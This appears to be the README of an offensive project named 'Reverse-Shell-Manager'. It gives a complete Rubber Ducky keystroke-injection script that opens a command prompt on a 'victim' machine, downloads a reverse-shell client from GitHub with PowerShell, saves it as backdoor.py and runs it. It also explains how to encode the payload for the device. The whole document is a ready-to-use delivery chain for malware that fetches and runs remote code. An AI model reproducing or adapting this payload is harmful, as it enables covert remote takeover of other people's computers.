﻿# Reverse-Shell-Manager


## We need to run client.py file in victim's machine to execute the payload. So I used rubber ducky here to transmit the malware.

# ducky script: <br>
DELAY 1000<br>
GUI r<br>
ENTER<br>
DELAY 100<br>
STRING cmd<br>
ENTER<br>
DELAY 1000<br>
STRING pip install rsa pyautogui && powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/VishnuChebolu/Reverse-Shell-Manager/main/client.py' -OutFile 'c:\Users\%username%\Desktop\backdoor.py'" && cd Desktop &&python backdoor.py<br>
ENTER


The above script just download client.py file from github and execute it.

Go to https://shop.hak5.org/pages/ducky-encoder to encode the payload into bin file and insert the bin file in the rubber ducky.
